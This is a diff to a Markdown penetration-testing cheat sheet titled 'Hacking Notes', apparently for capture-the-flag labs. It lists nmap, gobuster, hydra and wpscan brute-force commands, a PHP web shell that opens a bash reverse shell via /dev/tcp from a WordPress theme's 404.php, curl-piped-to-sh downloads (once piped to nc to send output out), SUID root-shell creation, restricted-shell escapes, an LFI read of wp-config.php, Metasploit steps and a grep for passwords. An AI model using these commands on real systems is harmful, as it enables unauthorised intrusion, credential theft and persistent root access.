@@ -1,123 +1,178 @@
-# Hacking Notes  
+# Hacking Notes
 
-## Configuration files: 
-|Description                | Command                         |Syntax                 |
-|----------------|-------------------------------|-----------------------------|
-| Use of VPN | openvpn           |openvpn [FILE]            |
-| Use of nmap | nmap           | nmap [IP]/[RANGE] [OPTIONS]            |
-| UDP nmap scan | nmap           | nmap [IP]/[RANGE] -sU             |
-| TCP nmap scan (no ping) | nmap           | nmap [IP]/[RANGE] -Pn             |
-| Directory discovery | gobuster           | gobuster dir -u [URL] -w [WORDLIST e.g. /usr/share/wordlists/dirb/common.txt
+---
 
+## Configuration Files & Tools
 
-## Web files: 
-|Description                | Command                         |Syntax                 |
-|----------------|-------------------------------|-----------------------------|
-| Robots File | robots.txt           | [IP]/robots.txt        |
+| Description             | Command        | Syntax                                                  |
+|-------------------------|----------------|----------------------------------------------------------|
+| Use VPN                 | openvpn        | `openvpn [FILE.ovpn]`                                   |
+| TCP Nmap Scan (no ping) | nmap           | `nmap -Pn [IP]/[RANGE]`                                 |
+| UDP Nmap Scan           | nmap           | `nmap -sU [IP]/[RANGE]`                                 |
+| Directory Discovery     | gobuster       | `gobuster dir -u http://[URL] -w [WORDLIST]`            |
 
-## Data format: 
-|Description                | Command                         |Syntax                 |
-|----------------|-------------------------------|-----------------------------|
-| Get only strings | strings           | strings [FILE]        |
+---
 
-## Wordpress files
-|Description                | Syntax Path|                     
-|----------------|-------------------------------|
-| Conf backupfile | [file].swp        |
+## Web & Content Discovery
+
+| Description | Command     | Syntax                   |
+|-------------|-------------|--------------------------|
+| Robots.txt  | curl/browser| `http://[IP]/robots.txt` |
+
+---
+
+## File/Data Analysis
+
+| Description     | Command | Syntax            |
+|-----------------|---------|-------------------|
+| Extract strings | strings | `strings [FILE]`  |
+
+---
+
+## WordPress Recon
+
+| Description       | Examples/Paths                     |
+|-------------------|------------------------------------|
+| Backup/Swap Files | `[file].swp`, `.bak`, `.old`, etc. |
+
+---
 
 ## Access
-|Description                | Syntax Path|                     
-|----------------|-------------------------------|
-|ftp | ftp [IP]       |
-|ssh | ssh [IP]       |
-| smbclient | smbclient -L \\\\[IP]\\[Directory] |
 
-## Dictionaries
-|Description                | Syntax Path|                     
-|----------------|-------------------------------|
-| cewl (Custom Word List generator) | cewl [URL] > [PWDFILE]       |
+| Service    | Command Syntax                                |
+|------------|------------------------------------------------|
+| FTP        | `ftp [IP]`                                     |
+| SSH        | `ssh [user]@[IP]`                              |
+| SMB List   | `smbclient -L \\\\[IP]`                        |
+| SMB Access | `smbclient \\\\[IP]\\[Share]`                  |
 
+---
 
-## Bruteforce
+## Dictionary & Wordlist Generation
 
-|Description                | Syntax Path|                     
-|----------------|-------------------------------|
-| hydra | hydra -L [USRFILE] -P [PWDFILE] [IP] -s [PORT] http-post-form "[url]:method=wp.getUsersBlogs&user=^USER^&password=^PASS^:Invalid" -V       |
-| wordpress wpscan (using xmlrpc.php) | wpscan --url [URL] -U [USER] -P [PWDFILE]       |
+| Tool | Command                   | Syntax                         |
+|------|---------------------------|--------------------------------|
+| cewl | Generate custom wordlist  | `cewl [URL] > wordlist.txt`    |
 
+---
+
+## Bruteforce Attacks
+
+| Tool     | Description                      | Syntax                                                                                     |
+|----------|----------------------------------|--------------------------------------------------------------------------------------------|
+| hydra    | HTTP form brute force            | `hydra -L [USERS] -P [PASSWORDS] [IP] -s [PORT] http-post-form "[url]:...:Invalid" -V`    |
+| wpscan   | WordPress login brute force      | `wpscan --url [URL] -U [USER] -P [WORDLIST]`                                               |
+
+---
 
 ## Privilege Escalation
-Analysis with external files: curl [IP]:8000/linpeas.sh | sh | nc [IP] [PORT]
-Start HTTP Server: python3 -m http.server [PORT]
-Listen: nc -lvnp [PORT]
 
-One-liner (Spawn shell)
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+| Task                    | Command / Path                                                |
+|-------------------------|---------------------------------------------------------------|
+| Download LinPEAS        | `curl [IP]:8000/linpeas.sh | sh`                              |
+| Start HTTP server       | `python3 -m http.server 8000`                                |
+| Start Netcat listener   | `nc -lvnp [PORT]`                                             |
+| Spawn TTY shell         | `python3 -c 'import pty; pty.spawn("/bin/bash")'`             |
+| Reverse shell (PHP)     | See code block below                                          |
+| Find SUID exploit       | `find . -exec /bin/sh -p \; -quit`                            |
+| Make binary SUID        | `chmod u+s /tmp/bash`                                         |
 
+#### PHP Reverse Shell Example
 
-PHP Shell (Trigger)
-
-```
+```php
 <?php
-
 if (isset($_GET['trigger'])) {
     exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
 }
-Example: http://[IP]/wordpress/wp-content/themes/[THEME]/404.php?trigger=1)
+?>
 ```
-Binaries (and examples)
-```
-/usr/bin/dash -p
-Path: /usr/bin/find. Exp: find . -exec /bin/sh -p \; -quit
+Access at: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`
 
+---
+
+## Binary Exploits (Python)
+
+```python
 import os
 os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
 os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
-os.system('chmod u+s /bin/dash')
-
-
 ```
 
-LinPEAS
-```
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+---
+
+## Escape Restricted Shell
+
+| Method      | Command                                |
+|-------------|-----------------------------------------|
+| Vim escape  | `:!/bin/sh`<br>`:set shell=/bin/bash`<br>`:shell` |
+| Tab check   | Press `TAB TAB` to list allowed commands |
+
+---
+
+## Process Snooping Without Root
+
+| Tool     | Description               | Command/Source                                              |
+|----------|---------------------------|--------------------------------------------------------------|
+| pspy     | Monitor processes         | `./pspy64s` (from [pspy GitHub](https://github.com/DominicBreuker/pspy)) |
+
+---
+
+## Port Scanning One-Liner (Python)
+
+```python
+python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("10.10.10.0/24").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]'
 ```
 
-Escape  restricted environments (vim)
-```
-:!/bin/sh
-:set shell=/bin/sh // :set shell=/bin/bash
-:shell
-```
+---
 
-## Snoop on processes without need for root permissions
-```
-32-bit small version: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s
-ref: https://github.com/DominicBreuker/pspy
-```
-## Port Scanning
+## SSH Tunneling
 
-One-liner
-```
-python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("[RANGE]").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]' 
-```
+| Task              | Syntax                                 |
+|-------------------|----------------------------------------|
+| Dynamic tunnel    | `ssh -D [PORT] [USER]@[IP]`            |
 
-## Dynamic tunnel
-Over Socks 5: ssh -D PORT [USER]@[IP]
-![image](https://github.com/user-attachments/assets/bb6c4651-ac44-4144-9765-845565b9a826)
+---
 
-## Force the server to read and encode the file before processed
-Example (with LFI, wp file) 
-http://[IP]/lx.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+## Local File Inclusion - Base64 Read
 
-## Check commands in a restricted shell
-"TAB TAB"
+| Task                | URL Example                                                                 |
+|---------------------|------------------------------------------------------------------------------|
+| Base64 encode read  | `http://[IP]/page=php://filter/convert.base64-encode/resource=wp-config.php` |
 
-# Files
-vim ~/.bash_logout
-vim ~/.config/
+---
 
-## Samba
-Show directories: smbclient -L \\\\[IP]
-List files: smbclient \\\\[IP]\\[Directory]
-List files (example with proxy): proxychains smbclient \\\\[IP]\\[Directory]
+## Metasploit Basics
+
+| Task                | Command                                   |
+|---------------------|-------------------------------------------|
+| Start               | `msfconsole`                              |
+| Search modules      | `search <keyword>`                        |
+| Load module         | `use <module_path>`                       |
+| Show options        | `show options`                            |
+| Set target IP       | `set RHOSTS <target-ip>`                  |
+| Set local IP        | `set LHOST <your-ip>`                     |
+| Set payload         | `set PAYLOAD <payload>`                   |
+| Exploit             | `run` or `exploit`                        |
+| List sessions       | `sessions`                                |
+| Interact with session| `sessions -i <id>`                       |
+
+---
+
+## SMB Examples
+
+| Task              | Command                                  |
+|-------------------|-------------------------------------------|
+| List shares       | `smbclient -L \\\\[IP]`                   |
+| Access share      | `smbclient \\\\[IP]\\[Share]`             |
+| Use with proxy    | `proxychains smbclient \\\\[IP]\\[Share]` |
+
+---
+
+## Cleanup and File Checks
+
+| Task                        | Command                            |
+|-----------------------------|-------------------------------------|
+| Find passwords              | `grep -i password /etc/* 2>/dev/null` |
+| Check crontab               | `crontab -l`                        |
+| Inspect logout script       | `vim ~/.bash_logout`               |
+| Inspect user config         | `vim ~/.config/`                   |
